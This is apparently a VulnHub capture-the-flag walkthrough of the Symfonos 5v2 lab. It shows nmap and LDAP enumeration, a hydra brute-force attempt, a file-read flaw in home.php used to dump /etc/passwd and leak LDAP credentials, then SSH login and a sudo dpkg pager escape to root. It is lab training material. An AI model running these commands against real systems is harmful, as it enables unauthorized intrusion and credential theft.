# Symfonos 5v2 | VulnHub
https://www.vulnhub.com/entry/symfonos-52%2C415/

### 1. Scan
```bash
Nmap scan report for 192.168.34.156
Host is up, received arp-response (0.0020s latency).
Scanned at 2021-07-20 20:20:18 EDT for 18s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfhCNEk87fJIphggJ/K7+9vu2pm9OmRmuYZ4tIPDCr42LgzGp6EIWpz5FXo98F1iq1pNASEjcMqqpCxuhhOFSlf3pPA00Rka4/0pmlmtIl5jSE6cpexIXzINzLC6YXDt59JFuOi0PgsbBYbIWsRdNxPboBDELeilgNairkx3wakNr39Di1SmrpQyQ54EbpusuNZPZL9eBjgEScXrx+MCnA4gyQ+VwEbMXDBfC6q5zO+poZQ1wkAqg9+LFvd2RuwGB+06yFfVn84UpBh4Fxf+cpnKG0zJalRfI8ZhUgnvEnU7cIp8Yb94pUzXf1+m1Vsau8+0myI0aaljHt4RfSfI3T
|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHUvkrh2jAIVELCTy59BYzC3B0S4/jKkYOmS6N7anjrxvHW59thSrs7+3pvVhM5X0Og+FV4zkrMMfvw5jwTygeA=
|   256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKxA6/wOoEAbxcDJX8zdCYFQzulYfpxK4n4e7bUSUeeC
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp open  ldap     syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl? syn-ack ttl 63
MAC Address: 00:0C:29:E2:49:F5 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/20%OT=22%CT=1%CU=41479%PV=Y%DS=1%DC=D%G=Y%M=000C29%T
OS:M=60F76854%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Uptime guess: 40.901 days (since Wed Jun  9 22:43:15 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.97 ms 192.168.34.156

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 20 20:20:36 2021 -- 1 IP address (1 host up) scanned in 21.35 seconds
```
The machine is Debian, running SSH, a web server on port 80 and LDAP/LDAPS.

### 2. Enumeration
Managed to get the namingcontexts from LDAP which might be useful later. Can't really go much deeper than this for now.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ldapsearch -h 192.168.34.156 -x -s base namingcontexts 
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: dc=symfonos,dc=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Looking at the website, there is a big picture of zeus on the front page. Searching for other directories shows a admin.php, home.php and portraits.php page.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ gobuster dir -u http://192.168.34.156 -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.34.156
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2021/07/20 20:42:40 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 207]
/static               (Status: 301) [Size: 317] [--> http://192.168.34.156/static/]
/admin.php            (Status: 200) [Size: 1650]                                   
/home.php             (Status: 302) [Size: 979] [--> admin.php]                    
/logout.php           (Status: 302) [Size: 0] [--> admin.php]                      
/portraits.php        (Status: 200) [Size: 165]                                    
/server-status        (Status: 403) [Size: 279]
```

The portraits.php page has three other pictures of zeus. The admin.php is a login page, with a username and password to enter and not much else given away. Can try attacking this login page with the username of zeus, but this doesn't work.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ hydra -l zeus -P /usr/share/wordlists/rockyou.txt 192.168.34.156 http-get-form "/admin.php:username=^USER^&password=^PASS^:Invalid login"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-20 20:49:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get-form://192.168.34.156:80/admin.php:username=^USER^&password=^PASS^:Invalid login
[STATUS] 1547.00 tries/min, 1547 tries in 00:01h, 14342852 to do in 154:32h, 16 active
...
```

While this was running, check out home.php. Though it redirects to admin.php, the page can be curl'd to see the contents before the redirection occurs, as there does appear to be content in the page.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl http://192.168.34.156/home.php
<html>
<head>
<link rel="stylesheet" type="text/css" href="/static/bootstrap.min.css">
</head>
<body>
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <a class="navbar-brand" href="home.php">symfonos</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarColor02" aria-controls="navbarColor02" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarColor02">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item">
        <a class="nav-link" href="home.php">Home</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="http://127.0.0.1/home.php?url=http://127.0.0.1/portraits.php">Portraits</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="logout.php">Logout</a>
      </li>
    </ul>
  </div>
</nav><br />
<center>
<h3>Under Developement</h3></center>
</body>

```
Looking at the above, it looks as though the home.php page includes a url parameter which redirects to a specified URL. For example, curling for /etc/passwd shows the passwd file.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl 'http://192.168.34.156/home.php?url=/etc/passwd'
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
zeus:x:1000:1000:,,,:/home/zeus:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

It's worth also noting that php files don't execute through this, so a reverse shell can't be done. But reading php files is good because it means the admin.php file code can be retrieved, which appears to contain LDAP credentials.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl 'http://192.168.34.156/home.php?url=admin.php'
...
$bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD")
...
```

### 3. Enumerate LDAP some more
Use ldapsearch to query the domain for more information.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ldapsearch -x -D "cn=admin,dc=symfonos,dc=local" -w "qMDdyZh3cT6eeAWD" -p 389 -h 192.168.34.156 -b "dc=symfonos,dc=local" -s sub "(objectclass=*)"
# extended LDIF
#
# LDAPv3
# base <dc=symfonos,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# symfonos.local
dn: dc=symfonos,dc=local
objectClass: top
objectClass: dcObject
objectClass: organization
o: symfonos
dc: symfonos

# admin, symfonos.local
dn: cn=admin,dc=symfonos,dc=local
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator
userPassword:: e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=

# zeus, symfonos.local
dn: uid=zeus,dc=symfonos,dc=local
uid: zeus
cn: zeus
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/zeus
uidNumber: 14583102
gidNumber: 14564100
userPassword:: Y2V0a0tmNHdDdUhDOUZFVA==
mail: zeus@symfonos.local
gecos: Zeus User

# search result
search: 2
result: 0 Success

# numResponses: 4
# numEntries: 3
```
This output provides two sets of creds, once decoded from base64.
- `admin:{SSHA}UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm`
- `zeus:cetkKf4wCuHC9FET`

It looks like the admin password is protected with a salt, so that one won't be much use. However the second pair of credentials may be useful.

### 3. Get a shell
Log in over ssh.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ssh zeus@192.168.34.156       
The authenticity of host '192.168.34.156 (192.168.34.156)' can't be established.
ECDSA key fingerprint is SHA256:0LrOVGfXWfj1Vtdo1krp85ZDlnsb3DDJFap9cOF5WoA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.34.156' (ECDSA) to the list of known hosts.
zeus@192.168.34.156's password: 
Permission denied, please try again.
zeus@192.168.34.156's password: 
Linux symfonos5 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Feb  5 06:14:43 2020 from 172.16.1.1
zeus@symfonos5:~$ id
uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

### 4. Enumerate from user
Check sudo permissions and see that the user can run dpkg as root.
```bash
zeus@symfonos5:~$ sudo -l
Matching Defaults entries for zeus on symfonos5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zeus may run the following commands on symfonos5:
    (root) NOPASSWD: /usr/bin/dpkg
```

### 4. Escalate to root
The dpkg binary does not drop privileges and uses the default pager, meaning a shell can be opened by invoking /bin/sh within it.
```bash
zeus@symfonos5:~$ sudo dpkg -l
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                          Version                     Architecture Description
...
!/bin/sh
# whoami
root
```